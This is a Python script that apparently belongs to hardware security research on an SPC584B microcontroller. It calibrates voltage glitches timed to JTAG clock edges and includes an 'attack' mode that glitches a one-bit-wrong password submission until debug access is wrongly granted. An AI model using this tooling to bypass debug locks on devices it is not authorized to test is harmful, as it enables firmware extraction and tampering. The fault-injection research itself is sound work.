#!/usr/bin/env python3
"""Calibrate and fault the SPC584B JTAG-password transaction.

The experiment sends one uninterrupted 256-bit password scan. The Pico
Glitcher counts TCK edges from the start of that scan and fires early enough
for a delayed pulse to land before, during, or after the final scan clocks.

Six explicit modes are provided:

* controls: validate raw IDCODE and correct/wrong-password LCSTAT behavior;
* power-cycle-test: prove the selected cold-cycle method removes target power;
* edge-map: emit scope markers with the glitch lead physically disconnected;
* characterize: send the correct password and stop on the first changed result;
* sensitivity-map: map correct-password pass/fail behavior across a full grid;
* attack: send a one-bit-wrong password and stop on unexpected debug access.

One PyFtdi JTAG object remains alive across attempts. This script never writes
flash, UTEST, DCF, lifecycle, or OTP. Results are printed to stdout.
Sensitivity maps are also written to an explicit CSV path so an interrupted
run retains every completed attempt.
"""

from __future__ import annotations

import argparse
import csv
from dataclasses import dataclass
from pathlib import Path
import random
import stat
import struct
import sys
import time

from findus import PicoGlitcher
from findus.pyboard import PyboardError
from jtag_pyftdi import AccessProbe, SPC584BJtag
from power_relay import ManualPowerCycle, SerialPowerRelay


EXPECTED_IDCODE = 0x20144041
PASSWORD_BYTES = 32
TRIGGER_TIMEOUT_MARKER = "Function execution timed out!"

EXIT_NO_CANDIDATE = 0
EXIT_ERROR = 2
EXIT_CANDIDATE = 10


class ExperimentError(RuntimeError):
    pass


@dataclass(frozen=True)
class Point:
    delay_ns: int
    length_ns: int
    repeat: int


@dataclass(frozen=True)
class Result:
    state: str
    detail: str

    @property
    def access_observed(self) -> bool:
        return self.state == "ACCESS_JUN_SET"


def compact_error(error: Exception) -> str:
    return " | ".join(line.strip() for line in str(error).splitlines() if line.strip())


def read_password(path: Path) -> bytes:
    try:
        password = path.read_bytes()
        mode = stat.S_IMODE(path.stat().st_mode)
    except OSError as error:
        raise ExperimentError(f"cannot read password file {path}: {error}") from error
    if len(password) != PASSWORD_BYTES:
        raise ExperimentError(f"password file must be exactly {PASSWORD_BYTES} bytes")
    if password in (b"\x00" * PASSWORD_BYTES, b"\xff" * PASSWORD_BYTES):
        raise ExperimentError("refusing an all-zero or all-0xff password")
    if mode & 0o077:
        raise ExperimentError(
            f"password file permissions are {mode:04o}; run: chmod 600 {path}"
        )
    return password


def password_words(password: bytes, *, wrong: bool) -> tuple[int, ...]:
    value = bytearray(password)
    if wrong:
        value[0] ^= 0x01
    return struct.unpack(">8I", value)


def reset_and_verify_target(
    session: SPC584BJtag, hold_ms: int, retries: int
) -> None:
    """Re-arm security and prove that the raw main TAP is healthy."""
    observed: list[str] = []
    for _ in range(retries + 1):
        try:
            session.destructive_reset(hold_ms)
            idcode = session.read_idcode()
            observed.append(f"0x{idcode:08x}")
            if idcode == EXPECTED_IDCODE:
                return
        except Exception as error:
            observed.append(compact_error(error))
    raise ExperimentError(
        "target failed post-reset raw-IDCODE health gate: " + ",".join(observed)
    )


def verify_power_cycle(
    session: SPC584BJtag,
    controller,
    args: argparse.Namespace,
) -> None:
    """Prove that the selected method removes and restores target power."""
    controller.turn_on()
    time.sleep(args.power_settle_seconds)
    session.reset_lines_and_tap(hold_ms=100)
    before = session.require_idcode()
    print(f"POWER_ON_IDCODE=0x{before:08x}", flush=True)

    controller.turn_off()
    off_idcode: int | None = None
    off_error = ""
    try:
        time.sleep(args.power_off_seconds)
        try:
            off_idcode = session.read_idcode()
        except Exception as error:
            off_error = compact_error(error)
    finally:
        controller.turn_on()
        time.sleep(args.power_settle_seconds)

    if off_idcode is None:
        print(f"POWER_OFF_IDCODE=UNREADABLE detail={off_error}", flush=True)
    else:
        print(f"POWER_OFF_IDCODE=0x{off_idcode:08x}", flush=True)

    session.reset_lines_and_tap(hold_ms=100)
    after = session.require_idcode()
    print(f"POWER_RESTORED_IDCODE=0x{after:08x}", flush=True)
    if off_idcode == EXPECTED_IDCODE:
        raise ExperimentError(
            "power control did not remove target power: IDCODE remained valid while off"
        )


def wait_for_trigger(glitcher: PicoGlitcher, timeout: float) -> bool:
    try:
        glitcher.block(timeout=timeout)
    except PyboardError as error:
        message = " ".join(
            item.decode(errors="replace") if isinstance(item, bytes) else str(item)
            for item in error.args
        )
        if TRIGGER_TIMEOUT_MARKER in message:
            return False
        raise
    return True


def probe_access(session: SPC584BJtag) -> Result:
    """Read the authorization oracle directly; no halt or timeout is involved."""
    probe: AccessProbe = session.probe_access(samples=3)
    return Result(probe.state, probe.detail)


def submit_without_glitch(
    session: SPC584BJtag,
    words: tuple[int, ...],
    args: argparse.Namespace,
) -> Result:
    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
    session.select_password_register()
    session.submit_password_words(words)
    return probe_access(session)


def run_controls(
    session: SPC584BJtag,
    correct_words: tuple[int, ...],
    wrong_words: tuple[int, ...],
    args: argparse.Namespace,
) -> None:
    correct = submit_without_glitch(session, correct_words, args)
    print(f"CONTROL password=correct result={correct.state} detail={correct.detail}")
    if correct.state != "ACCESS_JUN_SET":
        raise ExperimentError(
            f"correct-password control failed without a glitch: {correct.state}"
        )

    wrong = submit_without_glitch(session, wrong_words, args)
    print(f"CONTROL password=wrong result={wrong.state} detail={wrong.detail}")
    if wrong.state not in ("NO_VALID_LCSTAT", "ACCESS_JUN_CLEAR"):
        raise ExperimentError(
            f"wrong-password control did not produce a reliable denied state: "
            f"{wrong.state}"
        )

    recovery = submit_without_glitch(session, correct_words, args)
    print(
        f"CONTROL password=correct_recovery result={recovery.state} "
        f"detail={recovery.detail}"
    )
    if recovery.state != "ACCESS_JUN_SET":
        raise ExperimentError(
            "correct-password control did not recover after the wrong-password "
            f"denial: {recovery.state}"
        )


def prepare_glitched_submission(
    session: SPC584BJtag, args: argparse.Namespace
) -> None:
    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
    if not args.strict_oracle:
        return

    # The relay path just performed the authoritative target power cycle.
    # Preserve the MPC574X ordering: cold cycle, IDCODE gate, arm, scan.
    # A Nexus/JUN probe here would disturb that state and require a second
    # cycle before the shot.
    if session.power_cycle is not None:
        print(
            "PRE_SHOT_COLD_BOOT_GATE=PASS result=EXPECTED_IDCODE",
            flush=True,
        )
        return

    locked = probe_access(session)
    if locked.state not in ("NO_VALID_LCSTAT", "ACCESS_JUN_CLEAR"):
        raise ExperimentError(
            "strict pre-shot lock gate failed after destructive reset without "
            f"a password: {locked.state} detail={locked.detail}"
        )
    print(
        "PRE_SHOT_LOCK_GATE=PASS "
        f"result={locked.state} detail={locked.detail}",
        flush=True,
    )
    # Reapply the same destructive reset after probing the locked core so the
    # password transaction always begins from a fresh, equivalent state.
    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)


def run_glitched_submission(
    session: SPC584BJtag,
    glitcher: PicoGlitcher,
    words: tuple[int, ...],
    point: Point,
    args: argparse.Namespace,
) -> Result:
    prepare_glitched_submission(session, args)
    session.select_password_register()

    glitcher.edge_count_trigger(
        pin_trigger=args.trigger_input,
        number_of_edges=args.edge_count,
        edge_type="rising",
    )
    glitcher.arm(point.delay_ns, point.length_ns)

    scan_error: Exception | None = None
    try:
        session.submit_password_words(words)
    except Exception as error:
        scan_error = error

    if not wait_for_trigger(glitcher, args.block_timeout):
        return Result("TRIGGER_TIMEOUT", TRIGGER_TIMEOUT_MARKER)

    result = probe_access(session)
    if result.state == "ORACLE_ERROR":
        raise ExperimentError(f"raw LCSTAT oracle failed: {result.detail}")

    if scan_error is None:
        return result
    detail = f"scan_error={compact_error(scan_error)};probe={result.detail}"
    if result.access_observed:
        return Result(result.state, detail)
    return Result("SCAN_OR_TARGET_FAULT", detail)


def emit_edge_marker(
    session: SPC584BJtag,
    glitcher: PicoGlitcher,
    words: tuple[int, ...],
    edge_count: int,
    args: argparse.Namespace,
) -> bool:
    """Emit a scope marker; GLITCH must be disconnected from the target rail."""
    reset_and_verify_target(session, args.reset_hold_ms, args.health_retries)
    session.select_password_register()
    glitcher.edge_count_trigger(
        pin_trigger=args.trigger_input,
        number_of_edges=edge_count,
        edge_type="rising",
    )
    glitcher.arm(0, args.marker_length_ns)
    session.submit_password_words(words)
    return wait_for_trigger(glitcher, args.block_timeout)


def inclusive_values(bounds: tuple[int, int], step: int) -> range:
    low, high = bounds
    first = ((low + step - 1) // step) * step
    return range(first, high + 1, step)


def build_points(args: argparse.Namespace) -> list[Point]:
    points = [
        Point(delay, length, repeat)
        for delay in inclusive_values(tuple(args.delay), args.step_ns)
        for length in inclusive_values(tuple(args.length), args.step_ns)
        for repeat in range(args.repeats)
    ]
    if not points:
        raise ExperimentError("the requested timing grid is empty")
    random.Random(args.seed).shuffle(points)
    if args.attempts:
        points = points[: args.attempts]
    return points


def summarize_sensitivity(
    cells: dict[tuple[int, int], dict[str, int]], step_ns: int
) -> None:
    def accepted(counts: dict[str, int]) -> int:
        return counts.get("ACCESS_JUN_SET", 0)

    def changed(counts: dict[str, int]) -> int:
        return sum(
            count for state, count in counts.items() if state != "ACCESS_JUN_SET"
        )

    stable_pass = {
        point
        for point, counts in cells.items()
        if accepted(counts) and not changed(counts)
    }
    stable_changed = {
        point
        for point, counts in cells.items()
        if changed(counts) and not accepted(counts)
    }
    mixed = set(cells) - stable_pass - stable_changed
    boundary = {
        point
        for point in stable_changed
        if any(
            neighbor in stable_pass
            for neighbor in (
                (point[0] - step_ns, point[1]),
                (point[0] + step_ns, point[1]),
                (point[0], point[1] - step_ns),
                (point[0], point[1] + step_ns),
            )
        )
    }

    print(
        "SENSITIVITY_SUMMARY "
        f"cells={len(cells)} stable_pass={len(stable_pass)} "
        f"stable_changed={len(stable_changed)} mixed={len(mixed)} "
        f"boundary_changed={len(boundary)}",
        flush=True,
    )
    for delay_ns, length_ns in sorted(mixed):
        counts = cells[(delay_ns, length_ns)]
        print(
            "SENSITIVITY_MIXED "
            f"delay_ns={delay_ns} length_ns={length_ns} "
            f"accepted={accepted(counts)} changed={changed(counts)}",
            flush=True,
        )
    for delay_ns, length_ns in sorted(boundary):
        counts = cells[(delay_ns, length_ns)]
        states = ",".join(
            f"{state}:{count}" for state, count in sorted(counts.items())
        )
        print(
            "SENSITIVITY_BOUNDARY "
            f"delay_ns={delay_ns} length_ns={length_ns} states={states}",
            flush=True,
        )


def apply_mode_defaults(args: argparse.Namespace) -> None:
    if args.repeats is None:
        args.repeats = 100 if args.mode == "attack" else 1
    if args.attempts is None:
        args.attempts = 100_000 if args.mode == "attack" else 0


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--mode",
        required=True,
        choices=(
            "controls",
            "power-cycle-test",
            "edge-map",
            "characterize",
            "sensitivity-map",
            "attack",
        ),
        help=(
            "controls validates raw JTAG without firing the Pico; power-cycle-test "
            "validates manual or relay power cycling; edge-map emits "
            "safe scope markers; characterize faults a correct "
            "password and stops on change; sensitivity-map records the full "
            "correct-password grid; attack faults a one-bit-wrong password"
        ),
    )
    parser.add_argument("--rpico", help="Pico Glitcher serial port")
    parser.add_argument(
        "--password-file",
        required=True,
        type=Path,
        help="32-byte SPC584B JTAG password file",
    )
    parser.add_argument(
        "--edge-count",
        type=int,
        metavar="EDGE",
        help="one TCK edge count for characterize/sensitivity-map/attack",
    )
    parser.add_argument(
        "--edge-range",
        nargs=2,
        type=int,
        default=(252, 264),
        metavar=("MIN", "MAX"),
        help="inclusive edge-map range (default: 252 264)",
    )
    parser.add_argument(
        "--marker-length-ns",
        type=int,
        default=8,
        help="scope-marker pulse width in edge-map mode (default: 8)",
    )
    parser.add_argument(
        "--confirm-glitch-disconnected",
        action="store_true",
        help="confirm GLITCH is physically disconnected from the target rail",
    )
    parser.add_argument("--delay", nargs=2, type=int, default=(0, 1000))
    parser.add_argument("--length", nargs=2, type=int, default=(8, 28))
    parser.add_argument("--step-ns", type=int, default=4)
    parser.add_argument(
        "--attempts",
        type=int,
        help=(
            "maximum shuffled attempts; 0 runs the complete grid "
            "(defaults: characterize/sensitivity-map=complete grid, attack=100000)"
        ),
    )
    parser.add_argument(
        "--repeats",
        type=int,
        help=(
            "repetitions per grid point "
            "(defaults: characterize/sensitivity-map=1, attack=100)"
        ),
    )
    parser.add_argument("--seed", type=int, default=584)
    parser.add_argument(
        "--output",
        type=Path,
        help="new CSV output path (required for sensitivity-map)",
    )
    parser.add_argument(
        "--trigger-input",
        default="default",
        choices=("default", "alt", "ext1", "ext2"),
    )
    parser.add_argument(
        "--ftdi-serial",
        help="select one SPC584B-DISP FTDI by USB serial when several are attached",
    )
    parser.add_argument(
        "--power-relay-port",
        help="serial port for the relay switching the board's 12 V DC feed",
    )
    parser.add_argument(
        "--manual-power-cycle",
        action="store_true",
        help="pause for manual use of the board's S1 ON/OFF switch each cycle",
    )
    parser.add_argument(
        "--reset-only-attack",
        action="store_true",
        help=(
            "exploratory attack mode: use guarded FTDI PORST resets between "
            "shots and abort if correct-password recovery fails"
        ),
    )
    parser.add_argument("--relay-baud", type=int, default=9600)
    parser.add_argument(
        "--relay-protocol",
        choices=("at", "lcus"),
        default="at",
        help="serial relay protocol (default: at)",
    )
    parser.add_argument("--relay-on-state", type=int, choices=(0, 1))
    parser.add_argument("--relay-off-state", type=int, choices=(0, 1))
    parser.add_argument("--power-off-seconds", type=float, default=1.5)
    parser.add_argument("--power-settle-seconds", type=float, default=4.0)
    parser.add_argument("--adapter-speed-khz", type=int, default=1000)
    parser.add_argument("--reset-hold-ms", type=int, default=250)
    parser.add_argument(
        "--health-retries",
        type=int,
        default=3,
        help="post-reset IDCODE recovery retries before aborting (default: 3)",
    )
    parser.add_argument("--block-timeout", type=float, default=2.0)
    parser.add_argument(
        "--strict-oracle",
        action="store_true",
        help=(
            "before every shot require the configured reset/IDCODE gate, then "
            "require correct-password recovery after every no-access result"
        ),
    )
    parser.add_argument(
        "--high-power",
        action="store_true",
        help="use the high-power crowbar only after validating it on a scope",
    )
    return parser.parse_args()


def validate_args(args: argparse.Namespace) -> None:
    if args.relay_on_state is None:
        args.relay_on_state = 1 if args.relay_protocol == "lcus" else 0
    if args.relay_off_state is None:
        args.relay_off_state = 0 if args.relay_protocol == "lcus" else 1
    for name in ("delay", "length"):
        low, high = getattr(args, name)
        if low < 0 or high < low:
            raise ExperimentError(f"invalid --{name.replace('_', '-')} range")
    edge_low, edge_high = args.edge_range
    if edge_low < 1 or edge_high < edge_low:
        raise ExperimentError("invalid --edge-range")
    pico_modes = {"edge-map", "characterize", "sensitivity-map", "attack"}
    if args.mode in pico_modes and not args.rpico:
        raise ExperimentError(f"{args.mode} mode requires --rpico")
    if args.power_relay_port and args.manual_power_cycle:
        raise ExperimentError(
            "choose only one of --power-relay-port and --manual-power-cycle"
        )
    if args.reset_only_attack and args.mode != "attack":
        raise ExperimentError("--reset-only-attack is supported only in attack mode")
    if args.reset_only_attack and (args.power_relay_port or args.manual_power_cycle):
        raise ExperimentError(
            "--reset-only-attack cannot be combined with a power-cycle option"
        )
    if args.reset_only_attack and not args.strict_oracle:
        raise ExperimentError("--reset-only-attack requires --strict-oracle")
    has_cold_cycle = bool(args.power_relay_port or args.manual_power_cycle)
    if args.mode == "power-cycle-test" and not has_cold_cycle:
        raise ExperimentError(
            "power-cycle-test requires --manual-power-cycle or --power-relay-port"
        )
    if args.mode in ("characterize", "sensitivity-map", "attack"):
        if not has_cold_cycle:
            if not (args.mode == "attack" and args.reset_only_attack):
                raise ExperimentError(
                    f"{args.mode} requires a real target power cycle via "
                    "--manual-power-cycle or --power-relay-port; "
                    "authoritative cold-cycle calibration is required"
                )
    if args.mode == "edge-map":
        if not args.confirm_glitch_disconnected:
            raise ExperimentError(
                "edge-map requires --confirm-glitch-disconnected after physically "
                "disconnecting GLITCH from the target rail"
            )
    elif args.mode not in ("controls", "power-cycle-test") and (
        args.edge_count is None or args.edge_count < 1
    ):
        raise ExperimentError(
            "characterize/sensitivity-map/attack require one positive --edge-count"
        )
    if args.mode == "sensitivity-map" and args.output is None:
        raise ExperimentError("sensitivity-map requires --output")
    if args.output is not None and args.mode != "sensitivity-map":
        raise ExperimentError("--output is currently supported only by sensitivity-map")
    if args.marker_length_ns <= 0:
        raise ExperimentError("--marker-length-ns must be positive")
    if args.step_ns <= 0:
        raise ExperimentError("--step-ns must be positive")
    if args.attempts is not None and args.attempts < 0:
        raise ExperimentError("--attempts cannot be negative")
    if args.repeats is not None and args.repeats <= 0:
        raise ExperimentError("--repeats must be positive")
    if args.adapter_speed_khz <= 0:
        raise ExperimentError("--adapter-speed-khz must be positive")
    if args.relay_baud <= 0:
        raise ExperimentError("--relay-baud must be positive")
    if args.relay_on_state == args.relay_off_state:
        raise ExperimentError("relay on/off states must differ")
    if args.power_off_seconds <= 0 or args.power_settle_seconds <= 0:
        raise ExperimentError("power-cycle durations must be positive")
    if args.reset_hold_ms < 0:
        raise ExperimentError("--reset-hold-ms cannot be negative")
    if args.health_retries < 0:
        raise ExperimentError("--health-retries cannot be negative")
    if args.block_timeout <= 0:
        raise ExperimentError("--block-timeout must be positive")


def main() -> int:
    args = parse_args()
    session: SPC584BJtag | None = None
    power_controller = None
    output_file = None
    try:
        validate_args(args)
        apply_mode_defaults(args)
        password = read_password(args.password_file)
        correct_words = password_words(password, wrong=False)
        wrong_words = password_words(password, wrong=True)

        if args.power_relay_port:
            power_controller = SerialPowerRelay(
                args.power_relay_port,
                protocol=args.relay_protocol,
                baudrate=args.relay_baud,
                on_state=args.relay_on_state,
                off_state=args.relay_off_state,
                off_seconds=args.power_off_seconds,
                settle_seconds=args.power_settle_seconds,
            ).open()
        elif args.manual_power_cycle:
            power_controller = ManualPowerCycle(
                off_seconds=args.power_off_seconds,
                settle_seconds=args.power_settle_seconds,
            ).open()

        power_cycle = (
            power_controller.power_cycle if power_controller is not None else None
        )

        if args.mode == "power-cycle-test":
            assert power_controller is not None
            print("MODE=power-cycle-test", flush=True)
            print("POWER_SOURCE=SPC584B_DISP_12V_DC_INPUT", flush=True)
            print(f"POWER_CONTROLLER={power_controller.name}", flush=True)
            session = SPC584BJtag(
                frequency_hz=args.adapter_speed_khz * 1000,
                serial=args.ftdi_serial,
                power_cycle=power_cycle,
            ).__enter__()
            verify_power_cycle(session, power_controller, args)
            run_controls(session, correct_words, wrong_words, args)
            print("EXPERIMENT_RESULT=POWER_CYCLE_TEST_PASS", flush=True)
            return EXIT_NO_CANDIDATE

        if args.mode == "controls":
            print("MODE=controls", flush=True)
            print("PASSWORD_SCAN=UNINTERRUPTED_256_BIT_DRSCAN", flush=True)
            print("JTAG_CONTROLLER=EXTERNAL_FTDI_PERSISTENT_PYFTDI_RAW", flush=True)
            print("TARGET_REARM=FTDI_EXTERNAL_PORST_PLUS_RAW_TAP_RESET", flush=True)
            print(
                "PORST_CONTROL=FTDI_ACBUS1_SRST_OUT_ACBUS5_DIRECTION",
                flush=True,
            )
            print(f"PORST_HOLD_MS={args.reset_hold_ms}", flush=True)
            print("POST_PASSWORD_ORACLE=DIRECT_NEXUS_LCSTAT_X3", flush=True)
            session = SPC584BJtag(
                frequency_hz=args.adapter_speed_khz * 1000,
                serial=args.ftdi_serial,
                power_cycle=power_cycle,
            ).__enter__()
            print(f"RAW_IDCODE=0x{session.require_idcode():08x}", flush=True)
            run_controls(session, correct_words, wrong_words, args)
            print("EXPERIMENT_RESULT=CONTROLS_PASS", flush=True)
            return EXIT_NO_CANDIDATE

        glitcher = PicoGlitcher()
        try:
            glitcher.init(port=args.rpico, enable_vtarget=False)
        except SystemExit as error:
            raise ExperimentError(
                f"PicoGlitcher initialization exited with status {error.code}"
            ) from error

        frequency_hz = int(glitcher.get_cpu_frequency())
        if frequency_hz <= 0 or 1_000_000_000 % frequency_hz:
            raise ExperimentError(
                f"unsupported PicoGlitcher frequency: {frequency_hz} Hz"
            )
        tick_ns = 1_000_000_000 // frequency_hz
        if args.mode != "edge-map" and args.step_ns % tick_ns:
            raise ExperimentError(
                f"--step-ns must be a multiple of the Pico timing tick ({tick_ns} ns)"
            )
        if args.mode == "edge-map" and args.marker_length_ns % tick_ns:
            raise ExperimentError(
                "--marker-length-ns must be a multiple of the Pico timing tick "
                f"({tick_ns} ns)"
            )

        if args.high_power:
            glitcher.set_hpglitch()
        else:
            glitcher.set_lpglitch()

        print(f"MODE={args.mode}", flush=True)
        print("PASSWORD_SCAN=UNINTERRUPTED_256_BIT_DRSCAN", flush=True)
        print("TRIGGER_REFERENCE=TCK_EDGES_AFTER_PASSWORD_IR_SELECTION", flush=True)
        print("JTAG_CONTROLLER=EXTERNAL_FTDI_PERSISTENT_PYFTDI_RAW", flush=True)
        if args.reset_only_attack:
            target_rearm = (
                "GUARDED_FTDI_EXTERNAL_PORST_PLUS_RAW_TAP_RESET_"
                "ABORT_ON_RECOVERY_FAILURE"
            )
        elif power_controller is not None:
            target_rearm = (
                f"FULL_BOARD_POWER_CYCLE_{power_controller.name}_PLUS_RAW_TAP_RESET"
            )
        else:
            target_rearm = "FTDI_EXTERNAL_PORST_PLUS_RAW_TAP_RESET"
        print(f"TARGET_REARM={target_rearm}", flush=True)
        if args.reset_only_attack:
            print(
                "RESET_ASSURANCE=EXPLORATORY_ABORT_IF_STRICT_RECOVERY_FAILS",
                flush=True,
            )
            print(
                "PORST_CONTROL=FTDI_ACBUS1_SRST_OUT_ACBUS5_DIRECTION",
                flush=True,
            )
            print(f"PORST_HOLD_MS={args.reset_hold_ms}", flush=True)
        if args.strict_oracle:
            pre_shot_gate = (
                "EXPECTED_IDCODE_AFTER_FULL_POWER_CYCLE"
                if power_cycle is not None
                else "EXPECTED_IDCODE_NO_JUN_FRESH_RESET"
            )
            print(f"PRE_SHOT_GATE={pre_shot_gate}", flush=True)
            print(
                "POST_SHOT_ORACLE=DIRECT_NEXUS_LCSTAT_X3_CORRECT_PASSWORD_RECOVERY",
                flush=True,
            )
        else:
            print("PRE_SHOT_GATE=EXPECTED_IDCODE", flush=True)
            print("POST_SHOT_ORACLE=DIRECT_NEXUS_LCSTAT_X3", flush=True)
        print(f"PICO_PIO_TICK_NS={tick_ns}", flush=True)

        session = SPC584BJtag(
            frequency_hz=args.adapter_speed_khz * 1000,
            serial=args.ftdi_serial,
            power_cycle=power_cycle,
        ).__enter__()
        if args.mode in ("characterize", "sensitivity-map", "attack"):
            if not args.reset_only_attack:
                assert power_controller is not None
                verify_power_cycle(session, power_controller, args)
        run_controls(session, correct_words, wrong_words, args)

        if args.mode == "edge-map":
            print("GLITCH_TARGET_CONNECTION=DISCONNECTED_CONFIRMED", flush=True)
            print("EDGE_MAPPING_REQUIRES_OSCILLOSCOPE=yes", flush=True)
            for edge_count in range(args.edge_range[0], args.edge_range[1] + 1):
                observed = emit_edge_marker(
                    session, glitcher, wrong_words, edge_count, args
                )
                print(
                    f"EDGE_MAP edge_count={edge_count} marker_observed="
                    f"{'yes' if observed else 'no'}",
                    flush=True,
                )
            print("EXPERIMENT_RESULT=EDGE_MAP_COMPLETE", flush=True)
            return EXIT_NO_CANDIDATE

        points = build_points(args)
        print(f"CALIBRATED_EDGE_COUNT={args.edge_count}", flush=True)
        print(f"POINTS_THIS_RUN={len(points)}", flush=True)

        csv_writer = None
        sensitivity_cells: dict[tuple[int, int], dict[str, int]] = {}
        if args.mode == "sensitivity-map":
            assert args.output is not None
            args.output.parent.mkdir(parents=True, exist_ok=True)
            try:
                output_file = args.output.open("x", newline="")
            except FileExistsError as error:
                raise ExperimentError(
                    f"refusing to overwrite sensitivity CSV: {args.output}"
                ) from error
            csv_writer = csv.writer(output_file)
            csv_writer.writerow(
                (
                    "timestamp_utc",
                    "attempt",
                    "edge_count",
                    "delay_ns",
                    "length_ns",
                    "repeat",
                    "result",
                    "access_observed",
                    "recovery_result",
                    "detail",
                )
            )
            output_file.flush()
            print(f"RESULTS_CSV={args.output}", flush=True)

        words = (
            correct_words
            if args.mode in ("characterize", "sensitivity-map")
            else wrong_words
        )
        started = time.monotonic()
        for attempt, point in enumerate(points):
            try:
                result = run_glitched_submission(
                    session, glitcher, words, point, args
                )
            except ExperimentError as first_error:
                print(
                    f"JTAG_REOPEN attempt={attempt} "
                    f"reason={compact_error(first_error)}",
                    flush=True,
                )
                session.close()
                session = SPC584BJtag(
                    frequency_hz=args.adapter_speed_khz * 1000,
                    serial=args.ftdi_serial,
                    power_cycle=power_cycle,
                ).__enter__()
                run_controls(session, correct_words, wrong_words, args)
                result = run_glitched_submission(
                    session, glitcher, words, point, args
                )

            recovery: Result | None = None
            if args.strict_oracle and not result.access_observed:
                recovery = submit_without_glitch(session, correct_words, args)

            elapsed = max(time.monotonic() - started, 0.001)
            print(
                f"ATTEMPT={attempt} edge_count={args.edge_count} "
                f"delay_ns={point.delay_ns} length_ns={point.length_ns} "
                f"repeat={point.repeat} result={result.state} "
                f"recovery={recovery.state if recovery else 'not-run'} "
                f"rate={(attempt + 1) / elapsed:.2f}/s detail={result.detail}",
                flush=True,
            )

            if csv_writer is not None:
                csv_writer.writerow(
                    (
                        time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                        attempt,
                        args.edge_count,
                        point.delay_ns,
                        point.length_ns,
                        point.repeat,
                        result.state,
                        int(result.access_observed),
                        recovery.state if recovery else "NOT_RUN",
                        result.detail,
                    )
                )
                assert output_file is not None
                output_file.flush()
                counts = sensitivity_cells.setdefault(
                    (point.delay_ns, point.length_ns), {}
                )
                counts[result.state] = counts.get(result.state, 0) + 1

            if recovery is not None:
                if recovery.state != "ACCESS_JUN_SET":
                    raise ExperimentError(
                        "strict post-shot recovery failed after "
                        f"{result.state}: {recovery.state} detail={recovery.detail}"
                    )
                print(
                    f"POST_SHOT_RECOVERY=PASS attempt={attempt} "
                    f"result={recovery.state} detail={recovery.detail}",
                    flush=True,
                )

            if result.state == "TRIGGER_TIMEOUT":
                raise ExperimentError(
                    f"edge count {args.edge_count} was not observed during the scan"
                )

            if args.mode == "attack" and result.access_observed:
                print(
                    "EXPERIMENT_RESULT=ACCESS_CANDIDATE "
                    f"edge_count={args.edge_count} delay_ns={point.delay_ns} "
                    f"length_ns={point.length_ns} repeat={point.repeat}",
                    flush=True,
                )
                print("DEVICE_LEFT_AUTHORIZED_WITHOUT_RESET=yes", flush=True)
                return EXIT_CANDIDATE

            if args.mode == "characterize" and result.state != "ACCESS_JUN_SET":
                print(
                    "EXPERIMENT_RESULT=FAULT_OBSERVED "
                    f"edge_count={args.edge_count} delay_ns={point.delay_ns} "
                    f"length_ns={point.length_ns} repeat={point.repeat} "
                    f"result={result.state}",
                    flush=True,
                )
                print(
                    "INTERPRETATION=physical_effect_not_password_compare_proof",
                    flush=True,
                )
                return EXIT_CANDIDATE

        if args.mode == "sensitivity-map":
            summarize_sensitivity(sensitivity_cells, args.step_ns)
            print("EXPERIMENT_RESULT=SENSITIVITY_MAP_COMPLETE", flush=True)
            return EXIT_NO_CANDIDATE

        final = (
            "NO_FAULT_OBSERVED"
            if args.mode == "characterize"
            else "NO_ACCESS_OBSERVED"
        )
        print(f"EXPERIMENT_RESULT={final}", flush=True)
        return EXIT_NO_CANDIDATE
    except KeyboardInterrupt:
        print("\nEXPERIMENT_RESULT=INTERRUPTED", flush=True)
        return 130
    except Exception as error:
        print(
            f"EXPERIMENT_RESULT=ERROR type={type(error).__name__} reason={error}",
            file=sys.stderr,
            flush=True,
        )
        return EXIT_ERROR
    finally:
        if output_file is not None:
            output_file.close()
        if session is not None:
            session.close()
        if power_controller is not None:
            power_controller.close(ensure_on=True)


if __name__ == "__main__":
    raise SystemExit(main())
